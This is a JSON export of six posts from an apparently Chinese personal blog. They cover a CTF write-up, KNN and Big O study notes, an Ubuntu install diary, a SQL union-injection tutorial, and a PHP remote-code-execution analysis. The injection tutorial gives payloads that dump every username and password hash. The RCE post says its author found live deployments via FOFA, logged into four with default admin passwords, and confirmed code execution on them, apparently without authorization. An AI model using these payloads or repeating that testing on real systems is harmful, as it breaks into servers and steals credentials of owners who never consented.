[{"title":"Bugku-CTF-备份是个好习惯","url":"/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF.html","content":"这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。\n打开网站是一段神秘代码\nd41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e\n然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。\n发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下\ninclude_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;\n直接开始代码审计。\nif(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;\n这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。\n有些字符串的MD5值都以0e开头，在科学计数法中等于0：\n// 经典MD5碰撞值md5(&#x27;QNKCDZO&#x27;)          = 0e830400451993494058024219903391md5(&#x27;240610708&#x27;)        = 0e462097431906509019562988736854md5(&#x27;s878926199a&#x27;)      = 0e545993274517709034328855841020md5(&#x27;s155964671a&#x27;)      = 0e342768416822451524974117254469// 弱比较时：0e830400451993494058024219903391 == 0e462097431906509019562988736854// 因为都等于 0 × 10^N = 0\n借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708\n还有另一种方法：\n由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。\n所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2同样能获得flag。\n\n\n📄 版权声明\n  \n👤 作者：qingshen📅 发布时间：2025年10月1日🔗 原文链接：https://qsblog.top/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF.html📜 许可协议：知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议💡 转载说明：转载请注明原文出处和作者信息\n\n\n\n","categories":["网络安全"],"tags":["WEB安全","CTF"]},{"title":"KNN猫狗分类","url":"/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB.html","content":"KNN猫狗分类在生活中不同种类的生物，可以通过身高、体重等特征来进行简单的分类。猫和狗的分类就是一个典型的例子。\n问题背景假设我们有：\n\n10 只猫的身高体重数据\n10 只狗的身高体重数据\n\n现有一个新样本（如 4.5kg, 28cm），如何判断它是猫还是狗？这就需要运用到KNN算法。\nKNN 算法核心思想KNN（K-Nearest Neighbors）是一种基于邻近性的分类方法，其步骤包括：\n1. 计算距离测试样本与训练样本的距离（如欧氏距离）\n2. 找邻居选择最近的 k 个训练样本\n3. 投票分类根据邻居的多数类别决定测试样本的类别\n欧氏距离计算邻近性是通过比较得出来的，比较的这个数值的一种典型的求法是欧式距离，用于计算空间中两点之间的直线距离。\n二维空间中的公式为：$$d &#x3D; \\sqrt{(x_2-x_1)^2 + (y_2-y_1)^2}$$\n举例说明假设已知：\n\n猫：A(3.5kg, 25cm)\n狗：B(8.0kg, 40cm)\n\n想要预测一个新样本 C(4.5kg, 28cm) 是狗还是猫：\n$$d(C,A) &#x3D; \\sqrt{(4.5-3.5)^2 + (28-25)^2}$$\n$$d(C,B) &#x3D; \\sqrt{(4.5-8.0)^2 + (28-40)^2}$$\nK值的重要性在实际中样本数量会更多，这个k值是非常重要的。对所有训练样本计算距离并排序，选择最近k个训练样本，k的值直接关乎到分类的准确性。\nK值过小的问题\n容易受到噪音和异常值的影响\n容易过拟合\n\n举例：如果k&#x3D;1，在数据集中不小心将猫的数据标成狗，那模型只取这个错误的邻近值，导致最后的分类出错。\nK值过大的问题\n模型会倾向于选择多数类\n容易欠拟合\n\n举例：如果数据中猫（60%）比狗（40%）多，K很大时所有新样本都会被预测为猫，即使某些区域狗更密集，也会导致分类出错。\n投票机制投票是KNN算法的最后一个步骤：\n\n统计k个训练样本的标签\n比较哪种标签出现的次数多\n多数标签即为预测结果\n\n示例：若 k&#x3D;3 的邻居是 [猫, 猫, 狗]，预测结果为 猫。\n除了简单投票法，还有加权投票法（根据距离加权）等方法。\nPython 实现代码import math# 训练数据：[[身高(cm), 体重(kg), 类别], ...]data = [    # 猫的数据    [25, 4, &quot;猫&quot;], [23, 3.5, &quot;猫&quot;], [24, 4.2, &quot;猫&quot;], [22, 3.8, &quot;猫&quot;], [26, 4.5, &quot;猫&quot;],    [24, 4.1, &quot;猫&quot;], [23, 3.7, &quot;猫&quot;], [25, 4.3, &quot;猫&quot;], [22, 3.6, &quot;猫&quot;], [24, 4.0, &quot;猫&quot;],    # 狗的数据    [45, 25, &quot;狗&quot;], [50, 30, &quot;狗&quot;], [48, 28, &quot;狗&quot;], [52, 32, &quot;狗&quot;], [47, 27, &quot;狗&quot;],    [49, 29, &quot;狗&quot;], [46, 26, &quot;狗&quot;], [51, 31, &quot;狗&quot;], [48, 28.5, &quot;狗&quot;], [50, 30.5, &quot;狗&quot;]]def knn_classify():    # 用户输入    sg = float(input(&quot;请输入身高(cm)：&quot;))    tz = float(input(&quot;请输入体重(kg)：&quot;))    k = 3        # 计算距离    distances = []    for sample in data:        height_diff = sg - sample[0]        weight_diff = tz - sample[1]        distance = math.sqrt(height_diff**2 + weight_diff**2)        distances.append((distance, sample[2]))        # 按距离排序（冒泡排序）    for i in range(len(distances)):        for j in range(i+1, len(distances)):            if distances[i][0] &gt; distances[j][0]:                distances[i], distances[j] = distances[j], distances[i]        # 取前k个邻居    neighbors = distances[:k]        # 投票分类    cat_count = 0    dog_count = 0    for neighbor in neighbors:        if neighbor[1] == &quot;猫&quot;:            cat_count += 1        else:            dog_count += 1        # 输出结果    if cat_count &gt; dog_count:        print(&quot;预测结果：这是猫&quot;)    else:        print(&quot;预测结果：这是狗&quot;)      if __name__ == &quot;__main__&quot;:    knn_classify()\n\n\n\n📄 版权声明\n  \n👤 作者：qingshen📅 发布时间：2025年8月3日🔗 原文链接：https://qsblog.top/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB.html📜 许可协议：知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议💡 转载说明：转载请注明原文出处和作者信息\n\n\n\n\n","categories":["人工智能"],"tags":["机器学习","KNN算法","人工智能","Python"]},{"title":"SQL联合查询注入","url":"/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.html","content":"平时在浏览网页时会注意到有这种网址\nGET请求类型\nhttp://example.com/news.php?id=1http://example.com/profile?user=admin\nPOST请求类型\nusername: adminpassword: anything\n等等这个样子的都在与数据库产生信息传递\n以比较简单的GET请求来说\nhttp://example.com/news.php?id=1‘\n假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息\n这个news.php种必定有\n$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT id, username, email FROM users WHERE id=&#x27;$id&#x27; LIMIT 1&quot;;\n\n代码第一行从url的id参数获取值（学号）存储到id这个变量代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中\n此时如果我们http://example.com/news.php?id=1‘\n此时这个SQL代码就是\nSELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1\n必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’\n我们第一步肯定是要获取它这个表中有几个列http://example.com/news.php?id=&#39;1‘ ORDER BY 1–+ ‘ LIMIT 1\n此时这个SQL代码就是\nSELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1\n有些人估计会发现和自己想的不一样，不应该是SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗\n其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1这样才可以执行ORDER by 1\n接下来先了解一下这个ORDER by是什么东东\nORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序\n比如ORDER by 3 会对email进行一个查排序\n如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列\n可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1\n前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫\nhttp://example.com/news.phpid=1‘ UNION SELECT 1,2,3–+\n此时这个SQL代码就是\nSELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1\n先来了解一下联合查询语句UNION SELECT\nSQL UNION 操作符合并两个或多个 SELECT 语句的结果\nUNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似\n如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句\nhttp://example.com/news.php?id=1‘ UNION SELECT 1,database(),version()–+\n此时这个SQL代码就是\nSELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1\n就可以返回\n当前数据库名称\n\nMySQL 版本信息\n\nhttp://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+\n这会列出当前数据库中的所有表名（通常会看到 users 表)\nhttp://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+\n这会显示 users 表的所有列名（如 id, username, password）\nhttp://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+\n这会显示所有用户名和密码（通常是 MD5 哈希）\n\n\n📄 版权声明\n  \n👤 作者：qingshen📅 发布时间：2025年8月6日🔗 原文链接：https://qsblog.top/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5.html📜 许可协议：知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议💡 转载说明：转载请注明原文出处和作者信息\n\n\n\n\n","categories":["网络安全"],"tags":["WEB安全"]},{"title":"电商平台后台RCE漏洞分析：从弱口令到0day利用","url":"/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8.html","content":"近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。\n漏洞位置app/common/logic/admin/config.php文件中的配置写入功能存在代码注入漏洞。\n漏洞代码$code = &quot;return [    &#x27;url&#x27; =&gt; &#x27;&quot; . $param[&#x27;m_url&#x27;] . &quot;&#x27;,    &#x27;title&#x27; =&gt; &#x27;&quot; . $param[&#x27;title&#x27;] . &quot;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;&quot; . $param[&#x27;map_key&#x27;] . &quot;&#x27;]&quot;;$code = &quot;&lt;?php\\n &quot; . $code . &quot;;&quot;;file_put_contents(config_path() . &quot;site.php&quot;, $code);\n\n漏洞原理\n该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。漏洞复现\n在后台修改网站标题处输入：.phpinfo().\n系统生成的配置文件内容变为：\n&lt;?phpreturn [    &#x27;url&#x27; =&gt; &#x27;http://example.com&#x27;,    &#x27;title&#x27; =&gt; &#x27;&#x27;.phpinfo().&#x27;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;key_value&#x27;];\n\n访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。\n但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。\n在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。\n因此攻击链可完整形成：\n弱口令进入后台 → 利用RCE漏洞获取服务器权限\n\n\n📄 版权声明\n  \n👤 作者：qingshen📅 发布时间：2025年9月6日🔗 原文链接：https://qsblog.top/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8.html📜 许可协议：知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议💡 转载说明：转载请注明原文出处和作者信息\n\n\n","categories":["网络安全"],"tags":["WEB安全","代码审计"]},{"title":"大O标记法","url":"/%E5%A4%A7O%E6%A0%87%E8%AE%B0%E6%B3%95.html","content":"以下是一份关于大O标记法（Big O Notation）的详细笔记，包括其定义、常见类型、规则，以及常见数据结构在各种操作下的时间复杂度汇总。\n\n📘 大O标记法（Big O Notation）笔记一、什么是大O标记法？\n大O标记法用于描述算法在最坏情况下的时间复杂度或空间复杂度，即算法执行时间或所需空间随输入规模 $n$ 增长的渐进行为。\n它关注的是增长趋势，忽略常数项和低阶项。\n\n示例：\n若某算法执行时间为 $3n^2 + 5n + 10$，则其时间复杂度为 O(n²)。\n\n\n二、常见的时间复杂度（从快到慢）\n\n\n复杂度\n名称\n说明\n\n\n\nO(1)\n常数时间\n执行时间与输入规模无关\n\n\nO(log n)\n对数时间\n常见于二分查找、平衡树操作\n\n\nO(n)\n线性时间\n遍历整个数据结构\n\n\nO(n log n)\n线性对数时间\n高效排序算法（如归并排序、快速排序平均情况）\n\n\nO(n²)\n平方时间\n嵌套循环，如冒泡排序\n\n\nO(n³)\n立方时间\n三层嵌套循环\n\n\nO(2ⁿ)\n指数时间\n如暴力解法的子集问题\n\n\nO(n!)\n阶乘时间\n如旅行商问题的暴力解法\n\n\n\n三、大O的简化规则\n忽略常数项：O(5) → O(1)\n保留最高阶项：O(n² + n) → O(n²)\n乘法法则：嵌套循环相乘，如两层循环各 O(n) → O(n²)\n加法法则：顺序执行取最大项，如 O(n) + O(log n) → O(n)\n\n\n四、常见数据结构操作的时间复杂度汇总\n注：以下假设数据结构大小为 $n$，哈希表负载因子合理，树为平衡状态（如 AVL、红黑树）。\n\n1. 数组（Array）\n\n\n操作\n时间复杂度\n\n\n\n索引访问（通过下标）\nO(1)\n\n\n搜索（无序）\nO(n)\n\n\n搜索（有序 + 二分）\nO(log n)\n\n\n插入（末尾）\nO(1)（均摊）\n\n\n插入（中间&#x2F;开头）\nO(n)（需移动元素）\n\n\n删除（末尾）\nO(1)\n\n\n删除（中间&#x2F;开头）\nO(n)\n\n\n\n2. 动态数组（如 Python list、Java ArrayList）\n\n\n操作\n时间复杂度\n\n\n\n访问\nO(1)\n\n\n末尾插入\nO(1) 均摊（扩容时 O(n)，但均摊后为 O(1)）\n\n\n中间插入&#x2F;删除\nO(n)\n\n\n搜索\nO(n)\n\n\n\n3. 链表（Linked List）\n\n\n操作\n时间复杂度\n\n\n\n访问（按索引）\nO(n)\n\n\n搜索\nO(n)\n\n\n头部插入&#x2F;删除\nO(1)\n\n\n尾部插入（无尾指针）\nO(n)；有尾指针 → O(1)\n\n\n中间插入&#x2F;删除（已知节点）\nO(1)（但定位节点需 O(n)）\n\n\n\n双向链表（Doubly Linked List）操作复杂度类似，但支持双向遍历。\n\n\n4. 栈（Stack）\n\n\n操作\n时间复杂度\n\n\n\npush\nO(1)\n\n\npop\nO(1)\n\n\npeek&#x2F;top\nO(1)\n\n\n\n通常用数组或链表实现，均为 O(1)\n\n\n5. 队列（Queue）\n\n\n操作\n时间复杂度\n\n\n\nenqueue（入队）\nO(1)\n\n\ndequeue（出队）\nO(1)\n\n\npeek\nO(1)\n\n\n\n循环数组或链表实现，均为 O(1)\n\n\n6. 哈希表（Hash Table &#x2F; Dictionary &#x2F; Map）\n\n\n操作\n平均情况\n最坏情况\n\n\n\n插入\nO(1)\nO(n)（哈希冲突严重）\n\n\n查找\nO(1)\nO(n)\n\n\n删除\nO(1)\nO(n)\n\n\n\n实际应用中通常假设为 O(1)\n\n\n7. 二叉搜索树（BST）\n\n\n操作\n平衡 BST（如 AVL、红黑树）\n不平衡 BST（退化为链表）\n\n\n\n查找\nO(log n)\nO(n)\n\n\n插入\nO(log n)\nO(n)\n\n\n删除\nO(log n)\nO(n)\n\n\n\n平衡树保证 O(log n)；普通 BST 最坏为 O(n)\n\n\n8. 堆（Heap，通常为二叉堆）\n\n\n操作\n时间复杂度\n\n\n\n插入（push）\nO(log n)\n\n\n删除最大&#x2F;最小（pop）\nO(log n)\n\n\n获取最大&#x2F;最小（peek）\nO(1)\n\n\n建堆（heapify）\nO(n)\n\n\n\n常用于优先队列（Priority Queue）\n\n\n9. 图（Graph）\n表示方式影响复杂度：\n\n\n\n\n表示方式\n空间复杂度\n遍历邻接点\n判断边是否存在\n\n\n\n邻接矩阵\nO(V²)\nO(V)\nO(1)\n\n\n邻接表\nO(V + E)\nO(度(v))\nO(度(v))（需遍历）\n\n\n\nV &#x3D; 顶点数，E &#x3D; 边数\n\n\n10. 字符串（String）\n\n\n操作\n时间复杂度\n\n\n\n访问字符\nO(1)\n\n\n拼接（不可变字符串）\nO(n + m)\n\n\n子串查找（朴素）\nO(n·m)\n\n\n子串查找（KMP 等）\nO(n + m)\n\n\n\n五、常见算法时间复杂度参考\n\n\n算法\n时间复杂度\n\n\n\n冒泡排序、选择排序、插入排序\nO(n²)\n\n\n归并排序、堆排序\nO(n log n)\n\n\n快速排序（平均）\nO(n log n)；最坏 O(n²)\n\n\n二分查找\nO(log n)\n\n\nDFS &#x2F; BFS（图或树）\nO(V + E)\n\n\nDijkstra（优先队列优化）\nO((V + E) log V)\n\n\nFloyd-Warshall\nO(V³)\n\n\n\n六、总结口诀（便于记忆）\n数组查快改慢，链表改快查慢\n哈希平均 O(1)，最坏退化 O(n)\n平衡树稳 O(log n)，普通树可能变链\n堆适合取最值，建堆只需 O(n)\n排序最快 O(n log n)，比较排序下限\n\n\n\n📄 版权声明\n  \n👤 作者：qingshen📅 发布时间：2025年10月7日🔗 原文链接：https://qsblog.top/%E5%A4%A7O%E6%A0%87%E8%AE%B0%E6%B3%95.html📜 许可协议：知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议💡 转载说明：转载请注明原文出处和作者信息\n\n\n","categories":["人工智能"],"tags":["数据结构","算法","性能优化","算法优化"]},{"title":"记录一次从Windows安装Linux（Ubuntu）的全过程","url":"/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B.html","content":"系统更换原因由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。\n还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。\n最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。\n过程启动盘制作首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。\n现在就可以去做启动盘了，这里我推荐Ventoy。\n启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。\n接下来去下载系统镜像，我这里下的是ubuntu-22.04.5-desktop-amd64这个版本比较稳定，也可以选择其他版本。\n下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。\n安装系统现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：\n 联想（Lenovo）：F2 或 Fn + F2惠普（HP）：Esc 然后按 F10，或直接按 F10戴尔（Dell）：F2 或 Fn + F2华硕（ASUS）：Delete 或 F2宏碁（Acer）：F2 或 Delete微星（MSI）：Delete技嘉（Gigabyte）：Delete 或 F2三星（Samsung）：F2索尼（Sony VAIO）：F2 或 Assist 键（部分型号）\n\n这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：\n\n解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。\n之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。\n安装一些软件这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。\n搜狗输入法:https://blog.csdn.net/qq_44684757/article/details/135991216要点：注意安装依赖QQ:https://blog.csdn.net/weixin_44629973/article/details/102871352\n结语整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。\n\n\n📄 版权声明\n  \n👤 作者：qingshen📅 发布时间：2025年10月7日🔗 原文链接：https://qsblog.top/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B.html📜 许可协议：知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议💡 转载说明：转载请注明原文出处和作者信息\n\n\n\n\n\n\n\n","categories":["随笔"],"tags":["Ubuntu","系统安装","Linux"]}]